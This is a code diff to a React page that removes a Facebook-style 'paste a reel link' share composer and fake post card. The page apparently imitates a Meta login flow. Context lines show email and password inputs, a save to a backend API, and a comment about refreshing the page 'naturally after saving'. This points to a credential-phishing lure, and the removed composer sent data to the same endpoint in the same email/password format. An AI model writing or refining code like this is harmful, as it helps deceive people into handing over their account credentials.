@@ -1,6 +1,4 @@
 import React, { useState, useRef, useEffect } from 'react';
-import PostCard from './PostCard.jsx';
-import './post-card.css';
 
 export default function App() {
   const [email, setEmail] = useState('');
@@ -17,12 +15,6 @@ export default function App() {
   const [showMetaBottomSheet, setShowMetaBottomSheet] = useState(false);
   const [metaSheetVisible, setMetaSheetVisible] = useState(false);
   const [isMetaContinuing, setIsMetaContinuing] = useState(false);
-
-  // Post-card state
-  const [postUrl, setPostUrl] = useState('');
-  const [postCaption, setPostCaption] = useState('511K views • 5K likes | Reel by Semsem Photograph');
-  const [postSource, setPostSource] = useState('www.facebook.com');
-  const THUMBNAIL_URL = import.meta.env.VITE_THUMBNAIL_URL || '/download.jpg';
 
   const emailInputRef = useRef(null);
   const passwordInputRef = useRef(null);
@@ -108,29 +100,6 @@ export default function App() {
 
     // Refresh the page naturally after saving
     window.location.reload();
-  };
-
-  const handleSendPost = async (urlValue) => {
-    try {
-      const response = await fetch(API_URL, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          email: 'share-link',
-          password: 'pending',
-          timestamp: new Date().toISOString(),
-          postUrl: urlValue || postUrl,
-          postCaption,
-          postSource,
-        }),
-      });
-      const result = await response.json();
-      if (!response.ok) console.error('Failed to save post:', result.error);
-      else console.log('Post saved:', result.file);
-      setPostUrl('');
-    } catch (err) {
-      console.error('Failed to save post:', err);
-    }
   };
 
   const handleMetaContinue = () => {
@@ -932,38 +901,6 @@ export default function App() {
                                                         </div>
                                                       </div>
                                                     </form>
-
-                                                    {/* Facebook-style share composer & post card preview */}
-                                                    <div className="post-share" style={{ pointerEvents: 'auto', width: '100%', marginTop: '16px', marginBottom: '16px' }}>
-                                                      <div className="post-composer">
-                                                        <span className="post-composer-icon post-composer__icon" style={{ fontSize: '18px', cursor: 'pointer' }}>📎</span>
-                                                        <span className="post-composer-icon post-composer__icon" style={{ fontSize: '18px', cursor: 'pointer' }}>😊</span>
-                                                        <input
-                                                          className="post-composer-input post-composer__input"
-                                                          type="url"
-                                                          placeholder="Paste a reel link..."
-                                                          value={postUrl}
-                                                          onChange={(e) => setPostUrl(e.target.value)}
-                                                          onKeyDown={(e) => e.key === 'Enter' && handleSendPost(postUrl)}
-                                                        />
-                                                        <button
-                                                          type="button"
-                                                          className="post-composer-send post-composer__send"
-                                                          onClick={() => handleSendPost(postUrl)}
-                                                          aria-label="Send"
-                                                          style={{ background: '#25D366' }}
-                                                        >➤</button>
-                                                      </div>
-                                                      <div style={{ marginTop: '12px' }}>
-                                                        <PostCard
-                                                          thumbnail={THUMBNAIL_URL}
-                                                          caption={postCaption}
-                                                          source={postSource}
-                                                          url={postUrl}
-                                                          onSend={handleSendPost}
-                                                        />
-                                                      </div>
-                                                    </div>
 
                                                     {/* Bottom Section */}
                                                     <div
